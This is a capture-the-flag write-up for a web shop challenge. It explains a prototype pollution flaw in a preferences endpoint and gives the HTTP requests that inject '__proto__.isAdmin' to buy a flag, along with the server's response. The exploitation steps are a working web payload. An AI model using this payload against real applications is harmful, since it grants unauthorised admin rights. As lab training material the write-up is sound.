# Evilcorp Marketplace - Writeup

## Challenge Description
This challenge presents a simple web shop where users can purchase various items. Each user starts with $100, but the flag costs $1,000,000. The goal is to find a way to buy the flag despite having insufficient funds.

## Discovery & Vulnerability
The initial exploration of the shop reveals that users start with a $100 balance and several items are available for purchase, with the flag costing $1,000,000. Testing the API endpoints shows:
- GET /api/shop - Lists available items
- POST /api/init - Creates new user
- POST /api/purchase - Purchase endpoint
- POST /api/preferences - Interesting endpoint for user preferences

The application is vulnerable to Prototype Pollution through the `/api/preferences` endpoint. The endpoint uses an unsafe recursive merge function that allows modification of the Object prototype. This vulnerability exists because the application uses a vulnerable merge function, checks admin status through object properties, and has no sanitization of the `__proto__` property.

## Exploitation
1. First, initialize a new user:
```http
POST http://localhost:8002/api/init

Response:
{
   "userId": "<your-user-id>",
   "balance": 100
}
```
2. Then exploit prototype pollution:
```http
POST http://localhost:8002/api/preferences
Content-Type: application/json

{
    "userId": "<your-user-id>",
    "preferences": {
        "__proto__": {
            "isAdmin": true
        }
    }
}
```
3. Finally, purchase the flag:
```http
POST http://localhost:8002/api/purchase
Content-Type: application/json

{
    "userId": "<your-user-id>",
    "itemId": 5
}
```
The server returns:
```json
{
    "success": true,
    "message": "Purchase successful",
    "flag": "UiTHack25{Pr0t0typ3_P0llut1on_Expl01t3d!}",
    "balance": 100
}
```